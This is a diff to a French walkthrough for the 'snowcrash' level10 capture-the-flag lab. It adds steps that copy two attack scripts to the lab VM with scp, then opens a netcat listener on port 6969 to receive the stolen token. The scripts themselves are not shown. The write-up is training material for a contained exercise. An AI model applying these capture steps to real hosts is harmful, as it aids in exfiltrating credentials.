@@ -71,7 +71,28 @@ do
 done
 ```
 
-Il ne nous reste plus qu'à écouter les transfert avec la commande netcat `nc -lk` (`l` pour écouter & `k` pour conserver la connexion) sur le port de connexion `:6969`, pour obtenir le token.
+> Il est possible d'envoyer nos scripts directement dans notre user /tmp, grâce à la commande suivante :
+> scp -P 4242 [file_name] level10@192.168.56.101:/tmp
+
+```
+:~$ pwd
+[...]/snowcrash/level10/Ressources
+
+:~$ ls
+README.md  script1.sh script2.sh
+
+:~$ scp -P 4242 script1.sh level10@192.168.56.101:/tmp
+[...]
+level10@192.168.56.101's password:
+script1.sh // 100%   67   173.1KB/s   00:00
+
+:~$ scp -P 4242 script2.sh level10@192.168.56.101:/tmp
+[...]
+level10@192.168.56.101's password:
+script2.sh // 100%   67   173.1KB/s   00:00
+```
+
+Une fois les scripts téléchargés et lancés, il ne nous reste plus qu'à écouter les transfert avec la commande netcat `nc -lk` (`l` pour écouter & `k` pour conserver la connexion) sur le port de connexion `:6969`, pour obtenir le token.
 
 ```
 :~$ nc -lk 6969
